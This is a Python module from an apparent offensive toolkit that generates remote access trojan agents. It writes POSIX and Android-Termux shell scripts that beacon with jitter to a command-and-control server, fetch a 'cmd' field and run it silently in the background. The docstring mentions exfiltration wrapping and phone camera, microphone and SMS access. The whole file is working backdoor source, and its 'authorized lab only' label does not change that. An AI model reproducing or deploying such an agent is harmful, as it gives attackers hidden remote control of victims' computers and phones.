"""quantum.rat.agent — RAT agent profile generator (fleet console).

Generates a GHOSTFANG-compatible beacon agent: heartbeats to /r, executes
the task's "cmd" (stock protocol — no new server code needed). Output
exfil is NOT in the agent: the controller wraps every dispatched command
with wrap_exfil, so this profile stays a dumb, auditable exec loop with a
configurable beacon interval + jitter.

Variants: "posix" (curl loop) and "android-termux" (same loop, Termux
paths, wake-lock friendly longer default interval).
"""
from __future__ import annotations

import os
from datetime import datetime

from quantum.core.env import QCLI_DIR, local_ip
from quantum.core.logging import log


def generate_rat_agent(c2=None, interval=60, jitter=10,
                       variant="posix", out_dir=None):
    """Write the RAT agent script; returns the file path.

    interval/jitter in seconds (sleep = interval + RANDOM % (jitter+1)).
    Raises ValueError on bad variant or non-positive interval.
    """
    if variant not in ("posix", "android-termux"):
        raise ValueError(f"unknown variant {variant!r} (posix|android-termux)")
    interval = int(interval)
    if interval < 5:
        raise ValueError("interval must be >= 5s (OPSEC: no hot loops)")
    c2 = c2 or f"{local_ip()}:8443"
    out_dir = out_dir or QCLI_DIR
    os.makedirs(out_dir, exist_ok=True)

    if variant == "posix":
        fn = os.path.join(out_dir, "rat_agent.sh")
        script = f"""#!/bin/sh
# RAT agent profile (generated {datetime.now().isoformat()}) — authorized lab only
# Protocol: POST {{"host","act":"hb"}} to /r, exec task "cmd" via sh.
C2="http://{c2}/r"
H=$(hostname 2>/dev/null || echo rat-$(id -u 2>/dev/null || echo $$))
I={interval}
J={int(jitter)}
while :; do
  R=$(curl -s -m 10 -X POST "$C2" \\
       -H 'Content-Type: application/json' \\
       -d "{{\\"host\\":\\"$H\\",\\"act\\":\\"hb\\"}}" 2>/dev/null)
  C=$(echo "$R" | sed -n 's/.*"cmd":"\\([^"]*\\)".*/\\1/p')
  [ -n "$C" ] && (sh -c "$C" >/dev/null 2>&1 &)
  sleep $(( I + RANDOM % (J + 1) ))
done
"""
    else:
        fn = os.path.join(out_dir, "rat_agent_termux.sh")
        script = f"""#!/data/data/com.termux/files/usr/bin/sh
# RAT agent profile for Termux (generated {datetime.now().isoformat()}) — authorized lab only
# Requires: curl (pkg install curl). termux-api app only for snap/mic/sms calls.
C2="http://{c2}/r"
H=$(getprop ro.product.model 2>/dev/null | tr -d ' ' | head -c 16)
[ -z "$H" ] && H="termux-$RANDOM"
I={interval}
J={int(jitter)}
while :; do
  R=$(curl -s -m 10 -X POST "$C2" \\
       -H 'Content-Type: application/json' \\
       -d "{{\\"host\\":\\"$H\\",\\"act\\":\\"hb\\"}}" 2>/dev/null)
  C=$(echo "$R" | sed -n 's/.*"cmd":"\\([^"]*\\)".*/\\1/p')
  [ -n "$C" ] && (sh -c "$C" >/dev/null 2>&1 &)
  sleep $(( I + RANDOM % (J + 1) ))
done
"""
    with open(fn, "w", encoding="utf-8") as fh:
        fh.write(script)
    try:
        os.chmod(fn, 0o755)
    except OSError:
        pass
    log(f"RAT agent ({variant}, every ~{interval}s) -> {fn}", "C2")
    return fn
